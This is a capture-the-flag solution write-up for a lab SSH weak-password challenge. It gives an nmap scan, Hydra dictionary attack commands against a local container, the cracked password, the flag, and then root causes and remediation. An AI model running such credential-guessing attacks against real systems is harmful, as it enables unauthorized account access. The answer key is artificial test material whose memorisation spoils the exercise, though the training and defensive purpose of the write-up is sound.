# Solution — Game 1: SSH Weak Password Attack

## 1. Recon

Confirm SSH is exposed on the target:

```bash
nmap -p 2222 127.0.0.1
```

Expected output includes:

```
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
```

(nmap guesses the service name from the port number alone; a banner grab or
`-sV` scan confirms it's actually OpenSSH.)

## 2. Crack the credentials with Hydra

This game deploys the wordlist at `games/ssh-weak-password/files/wordlist.txt`
and, for convenience/verification, also copies it onto the target itself at
`/home/student/wordlist.txt`.

Using the project's attacker toolbox container (see the top-level README for
how it's built) on the shared `cyberrange-net` Docker network:

```bash
docker run --rm --network cyberrange-net \
  -v "$(pwd)/games/ssh-weak-password/files:/wordlists:ro" \
  cyberrange-attacker \
  hydra -l student -P /wordlists/wordlist.txt ssh://cyberrange-target
```

Or, attacking via the published host port instead of the shared Docker
network:

```bash
hydra -l student -P games/ssh-weak-password/files/wordlist.txt \
  ssh://127.0.0.1 -s 2222
```

Expected result:

```
[22][ssh] host: cyberrange-target   login: student   password: password123
1 of 1 target successfully completed, 1 valid password found
```

## 3. Log in and grab the flag

```bash
ssh -p 2222 student@127.0.0.1
# password: password123

cat ~/flag.txt
```

Expected flag:

```
WMG{ssh_w3ak_p4ssw0rds_are_never_ok}
```

## Why this works (root cause)

- `student`'s password (`password123`) appears in almost every public
  top-worst-passwords list, so it falls to a small, fast dictionary attack
  rather than requiring a full brute force.
- SSH password authentication is enabled with no account lockout, rate
  limiting, or fail2ban-style protection, so an attacker can attempt every
  candidate password with no penalty.
- The flag is only protected by the account's own file permissions
  (`~student` is `0700`, `flag.txt` is `0600`, both owned by `student`), so
  the *only* way to read it is to authenticate as that user — there is no
  shortcut through a misconfigured world-readable path.

## Remediation (what a real sysadmin should do)

- Enforce a minimum password strength policy (or disable password auth
  entirely and require SSH keys).
- Deploy `fail2ban` or equivalent to rate-limit/lock out repeated failed
  logins.
- Audit new accounts against known-breached password lists before they go
  live (e.g. with `pwquality`/HaveIBeenPwned-style checks).
